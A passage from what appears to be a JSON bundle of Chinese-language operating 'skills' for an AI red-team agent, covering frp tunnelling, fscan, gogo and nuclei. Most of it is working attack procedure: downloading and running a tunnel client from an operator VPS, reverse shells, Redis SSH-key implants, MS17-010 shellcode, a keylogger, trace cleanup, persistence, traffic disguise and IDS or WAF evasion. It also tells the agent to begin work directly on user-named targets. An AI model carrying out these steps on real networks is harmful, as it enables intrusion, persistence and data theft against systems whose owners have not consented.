`10.0.0.0/24`，实测出来再填，别猜）；\n   - `entry_kind`：**必须是 `target-outbound`**（目标反弹/目标上跑 chisel 客户端）或\n     `target-http`（经目标 WebShell）、`target-agent`（经目标已控进程）；\n     ⛔ 只在自己 VPS 上开代理填 `self-only`——**会被标\"不算突破\"**；\n   - `command`：完整命令原文（服务端 + 客户端两段都要）。\n2. **实测连通性**：`curl --socks5-hostname <listen> http://<内网目标>/` 或 `proxychains4 -f ... curl ...`，\n   通了才算隧道成立；然后 `redteam_session_check` 回写状态。\n3. **得分**：隧道可达内网 → `redteam_score_hit`（`boundary`，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；\n   通过它横向到其它主机 → `server-host`。\n4. **交付给用户**：给出可直接粘贴的配置——`socks5://<listen>`（或 `ssh -D` / frp 映射到用户机器的方法），\n   写清监听地址与端口，并说明该隧道跨越了靶标边界。\n5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要。"

    "chars": 4053,

    "builtin": true,
    "text": "# frp（内网穿透，最稳的长期隧道）\n\n> **先加载 VPS 配置**：本技能里所有 `$REDTEAM_VPS_HOST` / `$VPS_USER` 都来自本机配置，\n> 首次由 `bash $DSH_HOME/redteam/setup.sh` 写入 `$DSH_HOME/.env`。每条命令前先 source 一次：\n> ```bash\n> set -a; . \"$DSH_HOME/.env\" 2>/dev/null || . \"$HOME/.dsh/.env\"; set +a\n> VPS_USER=\"${REDTEAM_VPS_USER:-ubuntu}\"; VPS=\"$REDTEAM_VPS_HOST\"\n> ```\n> 没配过就跑一次 `setup.sh`（技能 `redteam-setup`），它同时会验证 SSH 连通性与载荷服务。\n\n`frp` 是**最稳定、最常用**的穿透方案：VPS 上跑 `frps`（服务端），目标上跑 `frpc`（客户端），\n把内网的 socks5 或任意端口映射出来。相比 suo5/chisel，它**专为长期稳定运行设计**（自动重连、多路复用、TLS），\n适合打进去之后**长期挂着**的内网通道。\n\n**分工**：有 WebShell → `suo5-tunnel`；只有命令执行要快速进内网 → `chisel-tunnel`；\n要**长期稳定 + 把端口给用户直接用** → 本技能。\n\n## 本机二进制\n\n| 文件 | 路径 | 用途 |\n| --- | --- | --- |\n| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | VPS 上的服务端 |\n| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | 目标上的客户端 |\n\n已同步到 VPS 载荷目录 `http://$REDTEAM_VPS_HOST:9100/`。VPS 上还有 `frps` 的配置样例。\n\n## 一、VPS 侧：起 frps（先做）\n\n```bash\n# 1) 上传并准备（本机 → VPS）\nscp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \\\n    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps\n\n# 2) 写配置（VPS 上）\ncat > /root/frps.toml <<'EOF'\nbindPort = 7000                 # frpc 连接端口\nauth.method = \"token\"\nauth.token = \"<随机强 token>\"   # 必填：公网暴露必须加 token，否则被扫到白用\n\n# 可选：vhostHTTPPort / vhostHTTPSPort 用于 HTTP 类型穿透\nEOF\n\n# 3) tmux 里跑（断开 SSH 也不能死）\ntmux new -s frps\n/root/frps -c /root/frps.toml\n```\n\n**VPS 安全组放行**：`7000`（frpc 连接口）+ 后续映射出来的端口（如 `1080`、`13389`）。\n\n## 二、目标侧：跑 frpc\n\n```bash\n# 1) 拉取二进制（通过已有命令执行点）\ncurl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc\n\n# 2) 写配置\ncat > /tmp/frpc.toml <<'EOF'\nserverAddr = \"$REDTEAM_VPS_HOST\"\nserverPort = 7000\nauth.method = \"token\"\nauth.token = \"<与 frps 相同的 token>\"\n\n# ① 内网 SOCKS5（最有用：整个内网可达）\n[[proxies]]\nname = \"socks5\"\ntype = \"tcp\"\nremotePort = 1080\n[proxies.plugin]\ntype = \"socks5\"\n\n# ② 指定端口映射（例：内网 RDP → VPS 13389）\n# [[proxies]]\n# name = \"rdp\"\n# type = \"tcp\"\n# localIP = \"10.0.0.5\"\n# localPort = 3389\n# remotePort = 13389\n\n# ③ 可选：HTTP 类型（走 80/443 出网受限时配合 frps 的 vhostHTTPPort）\n# [[proxies]]\n# name = \"web\"\n# type = \"tcp\"\n# localIP = \"10.0.0.6\"\n# localPort = 8080\n# remotePort = 18080\nEOF\n\n# 3) 后台常驻跑（nohup + 断线自动重连）\nnohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &\n# Windows 目标：frpc.exe -c C:\\Windows\\Temp\\frpc.toml（可用 sc create 注册服务持久化）\n```\n\n## 三、本机使用隧道\n\n```bash\n# SOCKS5 模式：VPS:1080 就是内网入口\nproxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/\n# 配置里写：socks5 $REDTEAM_VPS_HOST 1080\n# ⛔ 不要改 /etc/proxychains4.conf，用 -f 指向 runs/ 下临时配置\n\n# 端口映射模式：直连 VPS 端口\nrdesktop $REDTEAM_VPS_HOST:13389\nmysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p\n```\n\n## 四、出网受限时的变体\n\n| 限制 | 处理 |\n| --- | --- |\n| 只能出 80/443 | frps `bindPort = 443`（或先用 80 跑 HTTP 类型），frpc 对应改端口 |\n| 有 TLS 中间盒拦截 | frp 自带 `transport.tls.enable = true`（默认开）；必要时用 `transport.protocol = \"kcp\"` 或 `websocket` |\n| 目标不能出网 | frp 方案不可用 → 走 WebShell 侧隧道（`suo5-tunnel`） |\n| 需要伪装成正常流量 | `transport.protocol = \"websocket\"` + `transport.tls.enable = true`（走 443 时像普通 WebSocket） |\n\n## 五、持久化与纪律\n\n1. **必须跑在 tmux（服务端）/ nohup（客户端）**，否则会话一断隧道即失。\n2. **服务端必须加 `auth.token`**：公网 VPS 的 7000 端口会被全网扫，无 token 等于把内网送人。\n3. **token 不要复用**：每次演练生成新的随机 token；用完 `pkill frps` / `pkill frpc` 及时关闭。\n4. **目标侧注意落地痕迹**：二进制与配置放 `/tmp`，用完清理；Windows 用 `Temp` 目录。\n5. 直接按用户给的目标开工；用户补充了范围（如某 C 段、某个域名）就照补充的执行。\n\n## 六、输出与落库（强制）\n\n1. **隧道登记 `redteam_tunnel_add`**，字段写全：\n   - `kind`：`frp`；\n   - `listen`：用户实际使用的地址（如 `$REDTEAM_VPS_HOST:1080`）；\n   - `entry`：目标侧入口（如 `10.0.0.6 上 /tmp/frpc → VPS:7000`）；\n   - `reach`：**实测可达网段**；\n   - `entry_kind`：**`target-outbound`**（目标出网连我们的 frps——这是 frp 的典型形态）；\n     ⛔ 只在自己 VPS 上开代理填 `self-only` → 会被标\"不算突破\"；\n   - `command`：frps 与 frpc 两段完整命令 + 配置要点（token 脱敏）。\n2. **实测连通**：`curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<内网目标>/`，通了才登记为 active；\n   然后 `redteam_session_check` 复查。\n3. **得分**：`boundary`（隧道可达内网，evidence 写「隧道地址｜可达网段｜实测访问到的内网目标」）；\n   通过它横向 → `server-host`。\n4. **交付给用户**：给出可直接粘贴的 `socks5://$REDTEAM_VPS_HOST:1080` 或映射端口，写清地址与端口。\n5. 每个关键动作 `redteam_chain_add`（`stage_code=boundary-logical`），`tool` 写命令原文、`result` 写回显摘要\n   （如 `frpc 注册成功，proxy socks5 start success`）。"

      "version": "1.0.0",
      "whenToUse": "进入内网（跳板机/WebShell/socks5 隧道）后快速铺开资产面、找弱口令与未授权、把可达性变成可打点",

    "chars": 5958,
    "injectable": true,
    "builtin": true,
    "text": "# fscan（内网综合扫描与弱口令/漏洞）\n\n`fscan` = **广度优先的内网普查**：一段 C 段丢进去，几分钟内给出存活主机、开放端口、服务指纹、Web 标题、\n弱口令、未授权访问、高危漏洞。**噪声大**，只适合内网（对互联网目标用外部扫描技能）。\n\n## 与 gogo 的分工\n\n| | fscan | gogo |\n| --- | --- | --- |\n| 定位 | 综合普查 + 爆破 + 利用 | 高性能测绘 + 指纹 + 信息提取 |\n| 噪声 | 大（默认 600 线程 + 爆破 + POC） | 可控（`--opsec`、线程/超时自调） |\n| 先用哪个 | 目标明确、要快速找弱口令与洞 | 大网段先铺面、要指纹和 title |\n\n**推荐顺序**：先 `gogo` 铺面拿资产清单 → 再 `fscan` 对确认存活的目标做定向爆破与漏洞。\n\n## 二进制\n\n```\n本机 : $DSH_HOME/redteam/toolkit/fscan/fscan          （v2.2.1，含本地插件）\n       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe\n       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64\nVPS  : http://<你的VPS_IP>:9100/fscan                     （技能 vps-reverse-shell 的载荷目录）\n```\n\n安装脚本只下载 linux/amd64 的 `fscan`。Windows 与 ARM 文件需自行补上；当前平台只用上面的主文件。\n\n**传到跳板机/目标**（内网扫描必须在能到达内网的位置执行）：\n\n```bash\n# 跳板机上直接下载（VPS 起载荷服务：~/.dsh/redteam/toolkit/vps/vps.sh serve 9100）\ncurl -o fscan http://<你的VPS_IP>:9100/fscan && chmod +x fscan\n# 或从本机经 shells 上传\n```\n\n## 纪律（先看这条）\n\n1. **范围**：只用授权清单内的网段；用 `-eh/-ehf` 显式排除办公网、打印机、工控、云元数据（169.254.169.254）。\n2. **别打崩设备**：默认 `-t 600` 对老设备/工控很危险。内网先用 `-t 100 -time 3`，确认设备扛得住再加。\n3. **先无爆破再爆破**：第一轮 `-nobr -nopoc` 只做资产面；确认目标重要性和授权后，第二轮再放开。\n4. **避开蜜罐/IDS**：`-rate` 限速、`-maxpkts` 限量；管理员可能在看着。\n5. **DNSLog 外带**：`-dns -domain <你的dnslog域名>`，别用公共 DNSLog 传敏感数据。\n\n## 标准作业流程（SOP）\n\n```bash\n# 0) 确认自己在哪、能到哪\nip a; ip route\n\n# 1) 存活普查（最快，先圈定活人）\n./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor\n\n# 2) 资产面（不爆破、不打 POC，最安静）\n./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt\n\n# 3) Web 优先：把 assets.txt 里的 web 端口交给截图/指纹环节\n./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor\n\n# 4) 定向爆破（授权确认后）\n./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5\n\n# 5) 高危漏洞与未授权\n./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr\n./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc\n```\n\n## 参数速查（实测 v2.2.1 `-help`）\n\n**目标**\n```\n-h  <IP|CIDR|文件|域名>   目标（IP 段文件也吃）\n-hf <file>                主机文件        -eh/-ehf  排除主机/排除文件\n-u  <URL>  -uf <file>     单 URL / URL 文件     -domain <域名>\n```\n\n**端口与存活**\n```\n-p  21,22,80,443,3306,6379,10000-10100    端口（默认内置约 150 个常用端口）\n-pf <file>  端口文件        -ep 排除端口\n-np         禁用 ping 探测（只扫端口，快）      -ao  仅存活探测\n-nsp        禁用网段预筛（大网段提速）          -ntp 禁用 TCP 补充探测\n```\n\n**模式**\n```\n-m all        默认全流程（含爆破+POC）\n-m icmp       仅存活\n-m <插件>     只跑指定服务插件，例如 -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios\n-nobr         禁爆破   -nopoc 禁 POC   -noredis 禁 Redis 利用\n```\n\n**并发与节流**（OPSEC 关键）\n```\n-t 600       端口扫描线程        -time 3   端口超时(秒)\n-mt 20       模块线程            -wt 5     Web 超时\n-gt 0        全局超时(秒)        -retry 3  重试次数\n-rate 0      每分钟最大发包数(0=不限)   -maxpkts 0  总发包上限\n-num 20      POC 并发            -icmp-rate 0.1  ICMP 速率\n```\n\n**凭据（爆破）**\n```\n-user/-pwd      单组账号密码          -userf/-pwdf  字典文件\n-upf            用户名:密码 对文件     -usera/-pwda  追加多个（逗号/空格分隔）\n-hash/-hashf    NTLM Hash 碰撞        -sshkey       私钥登录\n```\n\n**利用（拿到就用，注意授权边界）**\n```\n-rf <pubkey>        Redis 写公钥（写 authorized_keys 拿 SSH）\n-rs                Redis Shell        -rwc/-rwf/-rwp  Redis 写入内容/文件/路径\n-rsh <ip:port>     反弹 Shell 到指定地址（配合技能 vps-reverse-shell）\n-sc <shellcode>    MS17-010 ShellCode\n-local <plugin>    本机插件：systeminfo / keylogger / cleaner 等（在跳板机上跑）\n-start-socks5 1080 在跳板机上开 SOCKS5 服务，把内网暴露给本机\n-fsh-port 4444     正向 Shell 服务端口\n```\n\n**代理（打隧道后的核心用法）**\n```\n-socks5 127.0.0.1:1080                 走 SOCKS5（suo5 / ssh -D / frp 都行）\n-socks5 socks5://user:pass@127.0.0.1:1080\n-proxy http://127.0.0.1:8080           走 HTTP 代理\n```\n\n**输出**\n```\n-o result.txt    输出文件        -f txt|json|csv   格式\n-no              不保存结果      -silent  静默     -nocolor/-nopg  关颜色/进度条\n-lang zh|en      语言            -log \"base,info,success\"   日志级别\n-dns             记录 DNS 日志（配合 -domain 做外带检测）\n-perf            输出性能统计 JSON\n```\n\n## 关键场景\n\n### 1. 通过隧道打内网（最常用）\n\n```bash\n# 前提：已有 socks5（技能 suo5-tunnel，或 vps-reverse-shell 里 ssh -D）\n# 实测验证过：fscan -socks5 会把流量真正送进隧道\n./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \\\n        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt\n```\n\n注意：走代理时线程别开太大（隧道本身是瓶颈），`-t 50` 左右足够。\n\n### 2. 在跳板机上开隧道给本机用\n\n跳板机上执行（把内网 10 段暴露到 VPS 的 9100 端口，再 ssh 本地转发回来）：\n\n```bash\n./fscan -start-socks5 1080      # 跳板机:1080 变成 SOCKS5\n# VPS 上反向隧道：ssh -R 9200:127.0.0.1:1080 ubuntu@<你的VPS_IP>\n# 本机：ssh -L 1080:127.0.0.1:9200 ubuntu@<你的VPS_IP>\n# 之后所有工具都能 -socks5 127.0.0.1:1080\n```\n\n### 3. 拿 Redis 直接要权限\n\n```bash\n./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # 写公钥 → ssh 上去\n./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell\n./fscan -h 10.0.0.5 -p 6379 -rsh <你的VPS_IP>:9000              # 反弹到 VPS 监听\n```\n\n### 4. 落到服务器上之后\n\n```bash\n./fscan -local systeminfo        # 系统信息、环境变量、域控、网卡\n./fscan -local keylogger         # 键盘记录（-keylog-output 指定输出）\n./fscan -local cleaner           # 痕迹清理\n```\n\n## 结果落库（必须做）\n\nfscan 的 txt 输出是分段的，解析后逐条入库：\n\n```bash\n# 每台存活主机\nredteam_asset_add  { engagement, ip, source: \"fscan\", tags: [\"internal\"] }\n# 每个开放端口/服务\nredteam_asset_add  { engagement, ip, port, service, banner }   # 或 asset_link 关联\n# 爆破/未授权成功的凭据与访问\nredteam_credential_add { engagement, host, username, secret_type, secret_ref: \"runs/fscan-<段>.txt\" }\nredteam_access_add     { engagement, host, username, method: \"ssh\", privilege, session_ref }\n# 确认的漏洞（必须配 http_evidence 或等价证据）\nredteam_vuln_add   { engagement, target, name: \"Redis 未授权访问\", severity: \"high\", evidence_ref }\n```\n\n**纪律**：`-o` 的输出文件是证据，拷回 `runs/`；不要只在终端里看一眼就算数。\n\n## 排障\n\n| 现象 | 处理 |\n| --- | --- |\n| 扫不动/极慢 | 去掉 `-np`、降 `-t`、加 `-time`；大网段先 `-m icmp` 圈活人 |\n| 全是假开放 | 中间有防火墙/负载均衡回 SYN-ACK，用 `-time` 调大 + `-retry` 复核 |\n| ICMP 失败 | 需要 root/`CAP_NET_RAW`；用 `sudo ./fscan -m icmp`，或改用 `-np` 只扫端口 |\n| 爆破被锁 | 先用 `-usera` 少量试，确认无锁定策略（域账号尤其危险） |\n| 中文乱码 | `-lang en` 或 `export LANG=zh_CN.UTF-8` |\n| 想更安静 | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`，必要时 `-silent` |\n\n## 相关技能\n\n- `gogo-intranet`：先用它铺面\n- `suo5-tunnel`：WebShell → SOCKS5，给 fscan 提供 `-socks5` 入口\n- `vps-reverse-shell`：`-rsh` 的落地端、载荷投递\n- `webshell-toolkit`：拿到 WebShell 后的管理"

    "text": "# gogo（内网测绘与指纹引擎）\n\n`gogo` = **高并发、低噪声、高度可配置的测绘引擎**。链式反应出品，专为红队内网场景设计：\n最小发包原则、主动+被动指纹、关键信息提取、内核级 POC 引擎（neutron，兼容 nuclei 模板）、\n支持 DSL/workflow 自定义。**先 gogo 铺面，再 fscan 打点。**\n\n## 与 fscan 的分工\n\n| | gogo | fscan |\n| --- | --- | --- |\n| 强项 | 大网段测绘、指纹、信息提取、可控发包 | 弱口令爆破、未授权、高危漏洞、利用 |\n| 默认噪声 | 低（`--opsec`、线程/超时可调） | 高（600 线程 + 爆破 + POC 全开） |\n| 输出 | `.dat`（deflate JSON Lines）+ 格式化 | txt/json/csv |\n| 典型用法 | `gogo -i 10.0.0.0/8 -m ss --ping -p top2,win,db --af` | `fscan -h 10.0.0.0/24 -nobr -nopoc` |\n\n## 二进制\n\n```\n本机 : $DSH_HOME/redteam/toolkit/gogo/gogo                （v2.15.0，4.3MB，自带 3138 条指纹）\n       $DSH_HOME/redteam/toolkit/gogo/gogo_windows_amd64.exe\n       $DSH_HOME/redteam/toolkit/gogo/gogo_linux_arm64\nVPS  : http://<你的VPS_IP>:9100/gogo                          （技能 vps-reverse-shell 的载荷目录）\n文档 : https://chainreactors.github.io/wiki/gogo/\n模板 : https://github.com/chainreactors/templates\n\n# 跳到跳板机/目标上执行\ncurl -o gogo http://<你的VPS_IP>:9100/gogo && chmod +x gogo\n```\n\n安装脚本不下载 gogo，需自行放到主文件路径。Windows 与 ARM 文件同样要自己补；当前平台只用上面的主文件。\n\n**零依赖**：单个静态二进制，指纹与提取规则全部内置，Windows 2003 都能跑。**不需要**额外配置文件。\n\n## 纪律\n\n1. **范围**：`--exclude` / `--exclude-file` 排除授权范围外网段，别把办公网和云元数据段扫了。\n2. **先探路再扫描**：`ip a; ip route; arp -a; cat /etc/hosts` —— 内网拓扑往往能省掉一半扫描。\n3. **OPSEC**：敏感环境加 `--opsec`，线程压到 `-t 200~500`，超时 `-d 3`；大网段必须 `--ping` 先过滤。\n4. **不要 `-p -`（全端口）扫大网段**，那是自杀式发包；先 `top2` 再对存活主机上全端口。\n\n## 核心概念\n\n### 端口预设（这工具的灵魂）\n\n```bash\ngogo -P port        # 列出全部预设 tag 与对应端口\n```\n\n常用 tag：`top1`(80,443,8080) · `top2`(数百个常见 Web/服务端口) · `top3` · `common`(内网常用) ·\n`win`(135,137,445,3389,winrm,oxid) · `db` · `http` · `docker` · `oracle` · `smb` · `all`(全集)\n\n```bash\np 组合：-p top2,win,db          # 逗号任意组合\np 范围：-p 1-1000               # 区间\np 全部：-p -                    # 等于 1-65535（慎用）\np 单点：-p 6379,mysql,12345\n```\n\n### 三种扫描模式\n\n| 模式 | 参数 | 适用 |\n| --- | --- | --- |\n| default | （默认） | 单 IP / 小网段（/24 以内） |\n| smart | `-m s` | /24~/16，AB 段探测 + 启发式发散 |\n| supersmart | `-m ss` | /16 以上大内网，先探点再筛选网段 |\n| sc | `-m sc` | 已知目标段、要更细的端口覆盖 |\n\n```bash\ngogo -i 192.168.1.0/24 -m s  --ping -p top2,win,db --af\ngogo -i 10.0.0.0/8    -m ss --ping -p top2,win,db --af\n```\n\n### workflow（把复杂命令存成预设）\n\n```bash\ngogo -P workflow     # 列出全部 workflow\ngogo -w 10           # 等价于扫 10.0.0.0/8 的 supersmart 全流程（all 端口）\ngogo -w 172          # 172.16.0.0/12\ngogo -w 192          # 192.168.0.0/16\ngogo -w interc       # 内网常见 C 段（10/172/192 三段）\ngogo -w 10 -i 11.0.0.0/8 -p top2   # 命令行可覆盖 workflow 参数\n```\n\n## 参数速查（实测 v2.15.0 `-h`）\n\n> **多字符长参数必须双横线**：`--ipp`、`--sp`、`--ef`、`--af`。单横线只给 `-i/-p/-m/-t/-d/-e/-v/-w/-F/-l/-L/-j` 这类单字符。\n\n**输入**\n```\n-i/--ip   192.168.1.1/24,172.16.1.1/24   目标，逗号分隔多个\n--exclude 10.0.0.1/24        --exclude-file <file>\n-l <file> 目标列表文件        -L  从 stdin 读目标\n-j <file> 复用上次结果(.dat)或 ip:port 列表，继续深挖     -J  从 stdin 读\n```\n\n**输出**\n```\n-f <file>        输出文件名         --path  输出目录\n-o <fmt>         命令行输出格式     -O <fmt>  文件输出格式（默认 jsonlines）\n--af             自动命名输出文件（.dat，deflate JSON Lines）\n--hf             自动命名隐藏文件   -C  关闭压缩      --tee  同时保留控制台输出\n-q/--quiet       关日志只留结果（联动其他工具必加）\n-F <file>        格式化已有 .dat 结果\n--filter / --output-filter / --scan-filter   历史过滤 / 实时过滤 / 提前停止\n```\n\n**智能扫描**\n```\n-m/--mod  default|s|ss|sc    扫描模式\n--ping                       先 ICMP 过滤（大网段必须）\n-n/--no                      只做智能扫描，不进入默认扫描\n--sp   smart 端口探针（默认 80，ss 模式默认 icmp）\n--ipp  AB 段 IP 探针（默认 1,254）\n```\n\n**性能与隐蔽**\n```\n-t/--thread <n>     并发（linux 默认 4000，内网建议 200~1000）\n-d/--timeout <秒>   超时（默认 2）\n-D/--ssl-timeout     SSL 超时\n--opsec             低噪声模式（敏感环境开）\n-s/--spray          端口优先喷洒（端口数 >500 自动启用）\n--no-spray          强制关闭喷洒\n```\n\n**指纹与提取**\n```\n-v/--verbose         主动指纹识别（不发这个只有被动指纹，信息少但安静）\n--ff <file>          自定义指纹库\n--extract \"<regex>\"  自定义提取正则\ngogo -P extract      查看内置提取规则（jwt / mail / idcard / phone / ip 等）\n```\n\n**漏洞（neutron 内核）**\n```\n-e/--exploit         开启 POC 扫描（与 -v 合用写作 -ev）\n-E <name>            指定模板名        --ef <file>  指定模板文件\n--payload <s>        指定 payload      --attack-type sniper|clusterbomb|pitchfork\n```\n\n**代理**\n```\n--proxy socks5://127.0.0.1:11111      # 实测可用，走 suo5 / ssh -D 隧道\n```\n\n## 标准作业流程（SOP）\n\n```bash\n# 0) 探路\nip a; ip route; arp -a; cat /etc/hosts /etc/resolv.conf\n\n# 1) 大网段测绘（安静、先探活、结果落文件）\n./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af -t 500 -d 3\n\n# 2) 看结果（human-like）\n./gogo -F ./.10.0.0.0_16_top2_win_db_ss_dat\n\n# 3) 对存活主机上全端口 + 主动指纹\n./gogo -i 10.0.1.0/24 -p - -v -t 1000 -d 3 --af\n\n# 4) 定向打 POC（只对确认有指纹的目标）\n./gogo -i 10.0.1.5,10.0.1.9 -p top2 -ev -E <模板名>\n\n# 5) 复用上一步结果继续深挖（不用重扫）\n./gogo -j ./step1.dat -p 1-65535 -v -e\n```\n\n### 走隧道测绘（内网渗透主路径）\n\n```bash\n# 前提：技能 suo5-tunnel 建好 socks5，或 vps-reverse-shell 里 ssh -D\n./gogo -i 10.0.0.0/16 -m ss --ping -p top2,win,db --af \\\n       --proxy socks5://127.0.0.1:1080 -t 300 -d 5 -q\n\n# 实测：gogo --proxy socks5:// 会把流量真正送进隧道（经 VPS 扫到的是 VPS 的 SSH 指纹）\n```\n\n隧道场景把 `-t` 降到 300 以内、`-d` 提到 5，否则隧道会丢包误判。\n\n## 结果落库（必须做）\n\ngogo 的 `.dat` 是压缩 JSON Lines，先格式化再解析入库：\n\n```bash\n./gogo -F ./result.dat -o json -f result.json      # 转成 JSON（实测产物结构见下）\npython3 tools/parse.py result.json\n# 解析要点：顶层是 {config, ip, data:[...]}，每条含 ip/port/protocol/status/frameworks/title/timing\n```\n```python\nimport json\nd = json.load(open('result.json', encoding='utf-8'))\nfor it in d.get('data', []):\n    fw = ','.join((it.get('frameworks') or {}).keys())\n    print(it.get('ip'), it.get('port'), it.get('protocol'), fw, it.get('title'))\n# 实测单条：{\"ip\":\"10.0.0.5\",\"port\":\"22\",\"protocol\":\"tcp\",\"status\":\"open\",\n#             \"frameworks\":{\"ssh\":{\"name\":\"ssh\",\"attributes\":{\"version\":\"10.3p1\"}}},\n#             \"title\":\"SSH-2.0-OpenS\",\"timing\":26}\n```\n\n```bash\n# 入库纪律（与 fscan 相同）\nredteam_asset_add      { engagement, ip, port, service, title, source: \"gogo\", tags: [...] }\nredteam_web_list       # 之后由 web 指纹技能补充 URL/标题\nredteam_vuln_add       { engagement, target, name, severity, evidence_ref }   # 必须配证据\n```\n\n**注意**：gogo 的框架/指纹结果写进 `asset` 的 `fingerprint` 字段，不要只留在终端里。\n扫到的敏感信息提取结果（邮箱/身份证/JWT）属于「大量敏感信息」得分点，用 `redteam_vuln_add` +\n`redteam_score_hit` 记录，证据落 `runs/`。\n\n## 排障\n\n| 现象 | 处理 |\n| --- | --- |\n| 参数报错 | 长参数用双横线（`--af` 不是 `-af`），`-P` 只接受 `port/workflow/neutron/extract` |\n| 结果文件找不到 | `--af` 写在**二进制同目录**，加 `--path` 指定目录 |\n| 大网段几乎没结果 | `--ping` 会漏掉禁 ping 主机；去掉 `--ping` 或改 `--ipp` 调整探针 |\n| 扫描太慢 | 提高 `-t`、降低 `-d`；`-p` 换成 `top1`/`top2`；大网段用 `-m ss` |\n| 被 IDS 发现 | `--opsec` + `-t 200` + `-d 3`；不要开 `-e`；不要 `-p -` |\n| 隧道里大量超时 | 降 `-t`、升 `-d`，隧道带宽是瓶颈 |\n| 想只看结果不看日志 | `-q`（联动其他工具必加） |\n\n## 相关技能\n\n- `fscan-intranet`：铺面之后的爆破与利用\n- `suo5-tunnel`：WebShell → SOCKS5，给 gogo 提供 `--proxy` 入口\n- `vps-reverse-shell`：隧道与载荷投递\n- `web-fingerprint` / `asset-correlation`：把 gogo 的结果进一步关联成资产图谱"

    "text": "# nuclei（模板化漏洞检测）\n\n`nuclei` 是漏洞发现阶段的**主力**：一条命令覆盖 CVE、暴露面、错误配置、默认口令、未授权访问。\n本机模板库已就位（详见下方路径），**不要上网重新找 POC**。\n\n## 本机二进制与模板\n\n| 项 | 值 |\n| --- | --- |\n| 二进制 | `/usr/bin/nuclei`（v3.11.1） |\n| 模板库 | `~/.local/nuclei-templates`（**13,742 个模板**） |\n| 模板版本 | v10.4.9（更新于 2026-09-18） |\n| 配置 | `~/.config/nuclei/config.yaml`、`.templates-config.json` |\n\n模板分布（写报告时按类引用）：`http/` 11,364（其中 `http/cves` 4,320、`http/misconfiguration` 981、\n`http/vulnerabilities` 961、`http/exposures` 707、`http/default-logins` 307）、`cloud/` 663、`file/` 447、\n`network/` 282、`dast/` 251。\n\n**更新模板**：`nuclei -update-templates`（频率不超过每周一次；更新后先跑 `-tl` 确认没坏）。\n\n## 基本用法\n\n```bash\n# 1) 单目标快速体检（先看会命中什么，不实际打）\nnuclei -u https://target.example.com -severity critical,high,medium -rl 30 -c 15\n\n# 2) 批量：从资产库导出的存活 URL 清单\nnuclei -l runs/alive-urls.txt -severity critical,high -rl 50 -c 25 \\\n  -jsonl -o runs/nuclei-$(date +%m%d-%H%M).jsonl\n\n# 3) 指定模板（已知组件版本 → 精确打击，命中率高、噪声小）\nnuclei -u http://target:8080 -t http/cves/2021/CVE-2021-44228.yaml\nnuclei -u http://target -t http/exposures/ -t http/default-logins/\n\n# 4) 按标签（tags）批量\nnuclei -l runs/alive-urls.txt -tags seeyon,weaver,panel,exposure -rl 20\n\n# 5) 只列出会跑的模板（不发包，先评估覆盖面）\nnuclei -l runs/alive-urls.txt -tags cve -tl\n```\n\n## 关键参数（本场景常用）\n\n| 参数 | 作用 | 建议 |\n| --- | --- | --- |\n| `-rl` | 每秒请求上限 | 互联网侧 30–50；被 WAF 盯上后降到 5 |\n| `-c` | 并发模板数 | 15–25，过高会打崩小站 |\n| `-severity` | 只跑指定等级 | 演练只关心 `critical,high`（中低危不得分） |\n| `-tags` / `-t` | 模板筛选 | 有指纹线索时优先用，别全量轰 |\n| `-jsonl -o` | 结构化输出 | **必须落 `runs/`**，报告要引用 |\n| `-proxy` | 走代理 | 降噪用 `cn-proxy-pool`；**内网目标走 suo5 隧道加 `-proxy socks5://127.0.0.1:1080`** |\n| `-H` | 自定义头 | 带 Cookie/Token 测登录后功能点 |\n| `-duc` | 禁用模板更新检查 | 批量跑时省时间 |\n| `-stats -si 30` | 进度输出 | 长任务看进度 |\n\n## 与知识库的配合（先查再打，禁止重复劳动）\n\n动手前先 `redteam_poc_search`（按 CVE / 组件 / 版本 / 正文特征）——它一次查两层：**本机 POC 知识库 + 本机 nuclei 模板库**。\n命中就用 `redteam_poc_get` 取全文或直接 `nuclei -t <模板>`；两层都没有才上网找，最后才手搓。\n\n验证有效的新模板/EXP 用 `redteam_poc_add` 回填知识库（带 `category` + `engagement` + `asset_target` + `verified` + `verified_note`，脱敏本次靶标信息）。\n\n## 降噪与自保（重要）\n\n1. **默认 ignore 已排除危险标签**：`~/.config/nuclei/.nuclei-ignore` 里默认忽略 `dos`、`local`、`fuzz`、`bruteforce`、`txt-service`——\n   **不要为了\"打得更全\"去掉这些忽略项**，DoS 类模板会打死生产系统，直接毁掉演练。\n2. **先探测后开火**：先用 `-severity critical,high` 跑一轮；命中后再对具体命中项深入，不要一上来全量。\n3. **WAF/封禁处理**：被拦先降 `-rl` 到 5 并加 `--delay 1s`，换 UA（`-H \"User-Agent: ...\"`），\n   必要时用技能 `cn-proxy-pool` 换出口；**同一目标累计被封 >3 次立刻放弃**（`redteam_asset_test` status=abandoned + blocked=true），转向下一个目标。\n4. 